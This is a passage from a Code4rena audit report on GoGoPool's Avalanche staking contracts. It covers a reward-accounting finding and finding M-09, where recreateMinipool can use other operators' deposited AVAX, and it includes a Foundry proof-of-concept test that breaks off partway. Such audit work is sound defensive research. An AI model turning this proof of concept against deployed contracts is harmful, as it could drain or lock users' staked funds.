href=\"https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L399-L403\">https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L399-L403</a>, same for the <code>recordStakingError</code></li>\n</ul>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1416059877\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>@Franfran - I can chime in here. </p>\n<p>When recreating a minipool, we intend to allow Node Operators to compound their staking rewards for the next cycle. </p>\n<p>Say that a minipool with 2000 AVAX was running. After one cycle the minipool was rewarded 20 AVAX. 15 AVAX goes to Node Operators and 5 AVAX to Liquid Stakers (in this example). </p>\n<p>When we recreate the minipool we want to allow the Node Operator to run a minipool with 1015 AVAX. Right now we require a 1:1 match of Node Operator to Liquid Staker funds, so that means we’ll withdraw 1015 AVAX from the Liquid Staking pool. That’s 10 AVAX more than we deposited from this one minipool. We are relying on there being 10 free floating AVAX in the Liquid Staking fund to recreate this minipool.</p>\n<p>The Warden says “The function assumes that a node operator and liquid stakers earned an equal reward amount”. We’re were not assuming that, but we are assuming that there will be some free AVAX in the Liquid Staker pool to withdraw more than we’ve just deposited from rewards.</p>\n<p>All that being said, we do not like this assumption and will change to use <code>avaxLiquidStakerAmt</code> instead of <code>avaxNodeOpAmt</code> for both. Ensuring that we will always have enough Liquid Staker AVAX to recreate the minipool and we will maintain the one-to-one match.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1423878926\">Alex the Entreprenerd (judge) set severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown a potential risk when it comes to accounting, fees and the requirement on liquid funds, more specifically the accounting in storage will use the values earned by the validator, however when recreating new funds will need to be pulled.</p>\n<p>The discrepancy may cause issues.</p>\n<p>I believe this report has shown a potential risk, but I also think the Warden should have spent more time explaining it in depth vs stopping at the potential invariant being broken.</p>\n<p>I’m flagging this out of caution after considering scrapping it / inviting the Wardens to follow up in mitigation review.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1424187308\">Jeiwan (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@emersoncloud - </p>\n<blockquote>\n<p>The Warden says “The function assumes that a node operator and liquid stakers earned an equal reward amount”. We’re were not assuming that</p>\n</blockquote>\n<p>As can be seen from the linked code snippet (the comments, specifically):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Compound the avax plus rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compoundedAvaxNodeOpAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The assumption is that the 1:1 funds ratio is preserved after rewards have been accounted. This can only be true when the reward amounts are equal, which is violated due to the fees applied to <code>avaxLiquidStakerRewardAmt</code>.</p>\n<p>@Alex the Entreprenerd - I’m sorry for not providing more details on how this can affect the entire system. Yes, my assumption was that extra staker funds would be required to recreate a pool, and there might be not enough funds staked (and deeper accounting may be affected, as pointed out by @Franfran), while the earned rewards + the previous staked amounts would be enough to recreate a pool.</p>\n<p>Thus, the mitigation that uses <code>avaxLiquidStakerAmt</code> for both amounts looks good to me, since, out of the two amounts, the smaller one will always be picked, which won’t require pulling extra funds from stakers. The difference between this mitigation and the mitigation suggested in the report, is that the latter uses the full reward amount in a recreated pool, while using <code>avaxLiquidStakerAmt</code> for both amounts leaves a portion of the reward idle.</p>\n<p>I also agree with the medium severity, the High Risk label was probably a misclick.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Use liquid staker avax amount instead of node op amount: <a href=\"https://github.com/multisig-labs/gogopool/pull/43\">multisig-labs/gogopool#43</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation not confirmed. Full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/52\">report from RaymondFam</a>, and also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"m-09-state-transition-minipools-can-be-created-using-other-operators-avax-deposit-via-recreateminipool\" style=\"position:relative;\"><a href=\"#m-09-state-transition-minipools-can-be-created-using-other-operators-avax-deposit-via-recreateminipool\" aria-label=\"m 09 state transition minipools can be created using other operators avax deposit via recreateminipool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569\">[M-09] State Transition: Minipools can be created using other operator’s AVAX deposit via recreateMinipool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569\">hansfriese</a>, also found by <a href=\"undefined\">bin2chen</a>, <a href=\"undefined\">0xdeadbeef0x</a>, <a href=\"undefined\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/864\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/795\">Allarious</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/779\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/753\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/677\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/647\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/616\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/584\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/498\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/491\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/484\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/439\">Nyx</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/423\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/398\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/362\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/353\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/332\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/324\">0Kage</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/269\">kaliberpoziomka8552</a></em></p>\n<p>This issue is related to state transition of Minipools.<br>\nAccording to the implementation, the possible states and transitions are as below.</p>\n<p><img src=\"https://imgur.com/ASL235O.jpg\" alt=\"Imgur\"></p>\n<p>The Rialto may call <code>recreateMinipool</code> when the minipool is in states of <code>Withdrawable, Finished, Error, Canceled</code>.<br>\nThe problem is that these four states are not the same in the sense of holding the node operator’s AVAX.<br>\nIf the state flow has followed <code>Prelaunch->Launched->Staking->Error</code>, all the AVAX are still in the vault.<br>\nIf the state flow has followed <code>Prelaunch->Launched->Staking->Error->Finished</code> (last transition by <code>withdrawMinipoolFunds</code>), all the AVAX are sent back to the node operator.<br>\nSo if the Rialto calls <code>recreateMinipool</code> for the second case, there are no AVAX deposited from the node operator at that point but there can be AVAX from other mini pools in the state of Prelaunch.<br>\nBecause there are AVAX in the vault (and these are not managed per staker base), <code>recreatePool</code> results in a new mini pool in <code>Prelaunch</code> state and it is further possible to go through the normal flow <code>Prelaunch->Launched->Staking->Withdrawable->Finished</code>.<br>\nAnd the other minipool that was waiting for launch will not be able to launch because the vault is lack of AVAX.</p>\n<p>Below is a test case written to show an example.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAudit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">duration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOp2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nodeOp2&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">duration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\"> }();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Prelaunch-&gt;Launched</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Launched-&gt;Staking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Staking-&gt;Error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;INVALID_NODEID&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingError</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// There are 2*depositAmt AVAX in the pool manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Staking-&gt;Finished withdrawing funds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawMinipoolFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">status</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Finished</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Rialto recreate a minipool for the mp1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Finished -&gt; Prelaunch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recreateMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Prelaunch -&gt; Launched</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Node Op 1: Launched -&gt; Staking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span 